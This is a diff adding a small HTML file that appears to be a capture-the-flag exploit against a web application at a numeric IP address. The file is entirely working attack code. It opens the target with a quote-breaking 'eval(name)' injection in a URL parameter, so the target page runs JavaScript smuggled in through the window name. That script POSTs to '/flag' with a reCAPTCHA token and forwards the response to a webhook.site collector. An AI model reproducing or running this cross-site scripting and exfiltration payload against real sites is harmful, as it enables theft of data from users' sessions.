@@ -1,0 +1,11 @@
+<script>
+let p = `fetch("/flag", {
+  "headers": {
+    "content-type": "application/x-www-form-urlencoded",
+  },
+  "body": "g-recaptcha-response=03AGdBq25-LBQxKL4RONcDGXvItDXFKimkRut-BCJHgSpz5W3REOieKUYaNFIg4xBx-95OV0KV3oInpOEFs8L4MRgqaN6qH7jKKPJR15qVRLkyvMxob2PdOt5aaly0Ke1nqRqKqMzwdiTd44kFGHz0RKOoOwcH1I6ifdkJCCl7dN3HkPflLU3qRuFpV77FeEfd8Jo7BI3GiV1V8x8iB_7FwEA4cY1H06WZcT5LctZrEjLBVOOhrotax7z5-rC486_pG_sufSY0sFdLPg3ZGfqhR7SX0KY1iNPMZr2GAKpBfFiP21v8QkoFQxyifeQB3yZquQrVkI-uMvR4Mr_jBjth3NlMIQRLj_F5ORDyadpmTUUp65NBq7jBUCIih30heTFssiW0oqENTUn1-tE0Hixv2TLbnODGdum5fkLwF6YzdFCq5PoKAUA7FwmYbvfJpyRP6Ju20DUWIybC",
+  "method": "POST",
+}).then(r=>r.text()).then(r=>fetch('https://webhook.site/0907603d-4c22-4361-a471-bde6124624e5?a=11'+r));`
+window.open('http://65.21.255.24:5000/?msg=\\%27;eval(name)//',p)
+</script>
+
